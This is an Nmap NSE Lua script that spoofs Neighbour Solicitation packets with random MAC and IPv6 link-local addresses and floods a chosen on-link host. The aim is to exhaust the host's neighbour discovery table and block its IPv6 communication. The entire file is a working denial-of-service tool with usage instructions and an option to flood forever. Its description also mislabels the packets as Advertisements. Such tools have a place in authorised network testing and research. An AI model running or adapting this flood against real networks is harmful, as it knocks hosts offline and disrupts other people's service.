local nmap = require "nmap"
local packet = require "packet"
local stdnse = require "stdnse"
local math = require "math"
local string = require "string"
local os = require "os"
local ipOps = require "ipOps"

description = [[ Generates a flood of Neighbour Advertisements (NA) with random spoofed data. The victim will try to resolve the spoofed MAC address, 
leaving his ND table filled with bogus entries. This leads to ND table entry exhaustion and inability to communicate over IPv6.
]]

---
-- @args ipv6-ns-flood.interface defines interface we should broadcast on
-- @args ipv6-ns-flood.target MAC address of the on-link host, we want to flood.
-- @args ipv6-ns-flood.timeout runs the script until the timeout (in seconds) is reached (default: 30s). If timeout is zero, the script will run forever.
--
-- @usage
-- nmap -6 --script ipv6-ns-flood.nse --script-args 'target=<mac>' -e <interace>
-- nmap -6 --script ipv6-ns-flood.nse --script-args 'interface=<interface>,target=<mac>'
-- nmap -6 --script ipv6-ns-flood.nse --script-args 'interface=<interface>,target=<mac>,timeout=10s'
--
-- @output
-- n/a

author = "Adam Števko"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

try = nmap.new_try()

math.randomseed(os.time())

prerule = function()
	if nmap.address_family() ~= "inet6" then
	 	stdnse.print_debug("%s is IPv6 compatible only.", SCRIPT_NAME)
		return false 
	end
	
	if not nmap.is_privileged() then
		stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)	
		return false 
	end

	if not stdnse.get_script_args(SCRIPT_NAME .. ".interface") and not nmap.get_interface() then
		stdnse.print_debug("No interface was selected, aborting...", SCRIPT_NAME)	
		return false 
	end

	if not stdnse.get_script_args(SCRIPT_NAME .. ".target") then
		stdnse.print_debug("No target was provided, aborting...", SCRIPT_NAME)
		return false
	end

	return true
end

local function get_interface()
	local arg_interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()

	local if_table = nmap.get_interface_info(arg_interface)
	
	if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
			return if_table.device
		else
			stdnse.print_debug("Interface %s not supported or not properly configured, exiting...", arg_interface)
	end			
end

--- Generates random MAC address
-- @return mac string containing random MAC address 
local function random_mac()

	local mac = string.format("%02x:%02x:%02x:%02x:%02x:%02x", 00, 180, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)
	return mac
end

--- Generates random IPv6 prefix
-- @return prefix string containing random IPv6 /64 prefix
local function get_random_prefix()
	local prefix = string.format("2a01:%02x%02x:%02x%02x:%02x%02x::", math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)

	return prefix
end

--- Build ICMPv6 payload of Neighbour Solicitation.
-- @param target_address IPv6 target address of solicitation
-- @param source_lla source link-layer address for options
-- @return icmpv6_payload string representing ICMPv6 NS payload
local function build_neigh_solicit(target_address, source_lla)
	local ns_msg = string.char(0x00, 	-- Reserved
							   0x00,	-- Reserved
							   0x00,	-- Reserved
							   0x00)	-- Reserved

	local icmpv6_source_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_SOURCE_LINKADDR, source_lla)

	local icmpv6_payload = ns_msg .. target_address .. icmpv6_source_link_option

	return icmpv6_payload
end

--- Function converting IPv6 link-local address to IPv6 solicited-node address
-- @param ip string representing IPv6 link-local address
-- @return solicited-node address as string
local function lladdr_to_solnaddr(ip) 

	if not ipOps.is_ipv6(ip) then
		return nil, "Invalid IPv6 address"
	end

	local ip, err = ipOps.expand_ip(ip)

	if err then
		return nil, err
	end

	ip = stdnse.strsplit(":", ip)

	return "ff02::1:ff" .. string.sub(ip[7], 3) .. ":" .. ip[8	]
end

--- Function to convert MAC address to solicited node multicast group MAC address
-- @param mac string representing MAC address
-- @return solicited-node multicast group MAC address

local function mac_to_solnmac(mac)

	mac = stdnse.strsplit(":", mac)

	return "33:33:ff:" .. mac[4] .. ":" .. mac[5] .. ":" .. mac[6]
end


--- Broadcasting on the selected interface
-- @param iface table containing interface information 
local function broadcast_on_interface(iface)
	stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface " .. iface)

	-- packet counter
	local counter = 0

	local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME..".timeout") or "30s")
	local arg_target = stdnse.get_script_args(SCRIPT_NAME..".target")

	local dnet = nmap.new_dnet()

	try(dnet:ethernet_open(iface))

	local target_mac = arg_target
	local target_lladdr = packet.mac_to_lladdr(packet.mactobin(target_mac))

	local dst_mac = packet.mactobin(mac_to_solnmac(target_mac))

	local dst_solnaddr = lladdr_to_solnaddr(packet.toipv6(target_lladdr))
	local dst_ip6_addr = packet.ip6tobin(dst_solnaddr)

	local start, stop = os.time()

	while true do

		local src_mac = packet.mactobin(random_mac()) 
		local src_ip6_addr = packet.mac_to_lladdr(src_mac)

		local pkt = packet.Frame:new()

		pkt.mac_src = src_mac
		pkt.mac_dst = dst_mac
		pkt.ip_bin_src = src_ip6_addr
		pkt.ip_bin_dst = dst_ip6_addr
		
		local icmpv6_payload = build_neigh_solicit(target_lladdr, src_mac)

		pkt:build_icmpv6_header(packet.ND_NEIGHBOR_SOLICIT, 0, icmpv6_payload)
		pkt:build_ipv6_packet()
		pkt:build_ether_frame()

		try(dnet:ethernet_send(pkt.frame_buf))

		counter = counter + 1

		if arg_timeout and arg_timeout > 0 and arg_timeout <= os.time() - start then
			stop = os.time()
			break
		end
	end

	if counter > 0 then
		stdnse.print_debug("%s generated %d packets in %d seconds.", SCRIPT_NAME, counter, stop - start)
	end
end

function action()
	interface = get_interface()
	
	broadcast_on_interface(interface)
end
